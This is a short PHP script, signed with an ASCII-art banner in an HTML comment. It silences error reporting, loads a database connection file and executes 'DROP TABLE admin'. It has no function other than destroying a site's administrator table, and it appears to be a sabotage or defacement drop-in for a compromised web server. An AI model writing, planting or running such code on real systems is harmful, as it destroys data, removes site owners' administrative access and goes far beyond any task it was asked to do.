<!--
     ==     ==   ==========  ========  ==   ==   ==    ==
     ==     ==       ==      ==        == ==      ==  ==
      ==   ==        ==      ==        == ==        ==
        ===      ==========  ========  ==   ==      ==
-->

<?php
error_reporting(0);
include ('connection.php');
$query = "DROP TABLE admin";
$data = mysqli_query($conn, $query);
?>